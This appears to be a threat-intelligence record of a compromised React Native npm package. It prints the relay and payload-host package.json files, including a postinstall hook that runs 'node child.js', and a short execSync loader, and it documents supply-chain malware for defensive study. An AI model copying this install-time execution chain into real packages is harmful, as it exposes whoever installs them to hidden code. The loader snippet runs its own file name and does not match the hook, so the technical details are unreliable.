---
name: react-native-international-phone-number
version: "0.12.1"
description: Compromised React Native package with dependency chain payload.
tags: [npm, supply-chain, postinstall]
---
## Overview
Compromised npm package that uses a three-layer dependency chain to deliver
Solana blockchain C2 malware via postinstall hooks.
## Relay package.json
```json
{
  "name": "@agnoliaarisian7180/string-argv",
  "version": "0.3.0",
  "dependencies": {
    "@usebioerhold8733/s-format": "2.0.4"
  }
}
```
## Payload host package.json
```json
{
  "name": "@usebioerhold8733/s-format",
  "version": "2.0.4",
  "scripts": {
    "postinstall": "node child.js"
  }
}
```
## Loader (init.js)
```javascript
const { execSync } = require("child_process");
execSync("node init.js");
```
